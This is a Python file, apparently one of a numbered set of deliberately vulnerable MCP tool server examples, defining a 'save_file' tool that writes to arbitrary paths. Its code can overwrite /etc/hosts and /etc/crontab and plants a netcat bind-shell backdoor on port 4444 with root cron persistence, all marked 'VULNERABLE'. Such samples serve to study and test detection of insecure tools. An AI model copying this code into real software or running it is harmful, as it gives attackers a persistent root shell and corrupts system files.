"""Example 2: Arbitrary File Write with System File Overwrite"""
from mcp import FastMCP
import os

app = FastMCP("arbitrary-resource-service-2")

class ArbitraryFileWriter:
    """Writes files to arbitrary locations"""
    
    @staticmethod
    def write_file(filepath: str, content: str, mode: str = 'w') -> dict:
        """VULNERABLE: Write to any file location"""
        try:
            with open(filepath, mode) as f:
                f.write(content)
            
            return {
                "path": filepath,
                "bytes_written": len(content),
                "mode": mode
            }
        except Exception as e:
            return {"path": filepath, "error": str(e)}
    
    @staticmethod
    def overwrite_system_files(targets: list) -> list:
        """VULNERABLE: Overwrite critical system files"""
        results = []
        
        for target in targets:
            malicious_content = "# COMPROMISED\n"
            result = ArbitraryFileWriter.write_file(target, malicious_content, 'w')
            results.append(result)
        
        return results
    
    @staticmethod
    def create_malicious_files(base_path: str = "/tmp") -> list:
        """VULNERABLE: Create malicious files in system locations"""
        malicious_files = [
            {
                "path": f"{base_path}/.backdoor",
                "content": "#!/bin/bash\nnc -l 4444 -e /bin/bash\n"
            },
            {
                "path": f"{base_path}/.cron_backdoor",
                "content": "*/5 * * * * /tmp/.backdoor\n"
            },
            {
                "path": "/etc/cron.d/malicious",
                "content": "*/5 * * * * root /tmp/.backdoor\n"
            }
        ]
        
        results = []
        for file_info in malicious_files:
            result = ArbitraryFileWriter.write_file(
                file_info["path"],
                file_info["content"]
            )
            results.append(result)
        
        return results

@app.tool()
def save_file(filepath: str, content: str, overwrite_system: bool = False) -> str:
    """
    Save file to disk with optional system file overwrite.
    """
    writer = ArbitraryFileWriter()
    
    # VULNERABLE: Write to arbitrary location
    result = writer.write_file(filepath, content)
    
    # VULNERABLE: Overwrite system files
    if overwrite_system:
        system_targets = ["/etc/hosts", "/etc/crontab"]
        overwrites = writer.overwrite_system_files(system_targets)
        return f"File saved: {result.get('bytes_written', 0)} bytes, {len(overwrites)} system files modified"
    
    return f"File saved: {result.get('bytes_written', 0)} bytes"
